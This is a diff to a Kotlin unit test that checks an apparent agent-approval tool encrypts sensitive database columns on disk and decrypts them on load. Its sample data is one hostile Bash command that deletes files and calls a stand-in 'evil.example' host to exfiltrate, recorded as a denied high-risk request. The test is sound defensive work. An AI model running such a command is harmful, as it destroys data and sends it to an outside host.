@@ -314,6 +314,80 @@ class DatabaseStorageTest {
     }
 
     @Test
+    fun columnEncryptionStoresCiphertextOnDiskButRoundTripsCleartextThroughLoad() {
+        // Build a brand-new storage in its own temp dir wired with a real
+        // ColumnCipher. The same temp dir is then re-opened with a null
+        // cipher to read the underlying column bytes and verify they are
+        // NOT the original plaintext.
+        val encDir = File(System.getProperty("java.io.tmpdir"), "db-enc-${System.nanoTime()}")
+        encDir.mkdirs()
+        try {
+            val key = javax.crypto.KeyGenerator.getInstance("AES").apply { init(256) }.generateKey()
+            val cipher = ColumnCipher(key)
+            val encryptedStorage = DatabaseStorage(encDir.absolutePath, cipher = cipher)
+
+            val sensitiveCommand = "rm -rf /tmp/secret && curl https://evil.example/exfiltrate"
+            val grepInput = mapOf<String, JsonElement>(
+                "command" to JsonPrimitive(sensitiveCommand),
+            )
+            val result = makeApprovalResult(
+                id = "enc-1",
+                toolName = "Bash",
+                feedback = "needs review of $sensitiveCommand",
+                toolInput = grepInput,
+                rawResponseJson = """{"behavior":"deny","cmd":"$sensitiveCommand"}""",
+                protectionDetail = "Detail mentioning $sensitiveCommand",
+                riskAnalysis = RiskAnalysis(risk = 4, label = "high", message = "Risky: $sensitiveCommand"),
+            )
+            encryptedStorage.insert(result)
+
+            // Round-trip via the encrypted storage — should give plaintext back.
+            val loaded = encryptedStorage.loadAll().single()
+            assertEquals(sensitiveCommand, loaded.request.hookInput.toolInput["command"]?.jsonPrimitive?.content)
+            assertEquals("needs review of $sensitiveCommand", loaded.feedback)
+            assertEquals("""{"behavior":"deny","cmd":"$sensitiveCommand"}""", loaded.rawResponseJson)
+            assertEquals("Detail mentioning $sensitiveCommand", loaded.protectionDetail)
+            assertEquals("Risky: $sensitiveCommand", loaded.riskAnalysis?.message)
+            encryptedStorage.close()
+
+            // Re-open WITHOUT a cipher and read raw column strings via JDBC.
+            // The on-disk values must be opaque ciphertext (v1: prefixed) and
+            // must NOT contain the plaintext command anywhere.
+            val conn = java.sql.DriverManager.getConnection(
+                "jdbc:sqlite:${File(encDir, "agent-approver.db").absolutePath}"
+            )
+            conn.use { c ->
+                c.prepareStatement(
+                    "SELECT raw_request_json, raw_response_json, tool_input_json, feedback, protection_detail, risk_message FROM history WHERE id = ?"
+                ).use { ps ->
+                    ps.setString(1, "enc-1")
+                    ps.executeQuery().use { rs ->
+                        assertTrue(rs.next())
+                        val cols = listOf(
+                            "raw_request_json" to rs.getString(1),
+                            "raw_response_json" to rs.getString(2),
+                            "tool_input_json" to rs.getString(3),
+                            "feedback" to rs.getString(4),
+                            "protection_detail" to rs.getString(5),
+                            "risk_message" to rs.getString(6),
+                        )
+                        for ((name, raw) in cols) {
+                            assertNotNull(raw, "$name should not be null")
+                            assertTrue(raw.startsWith("v1:"), "$name must be v1: prefixed, was: $raw")
+                            assertTrue(
+                                !raw.contains(sensitiveCommand),
+                                "$name must not contain plaintext command on disk",
+                            )
+                        }
+                    }
+                }
+            }
+        } finally {
+            encDir.deleteRecursively()
+        }
+    }
+
+    @Test
     fun backfillPopulatesToolInputFromRawRequestJson() {
         // Simulate a row that was inserted before tool_input_json existed:
         // tool_input_json is '{}' but raw_request_json has the full payload.
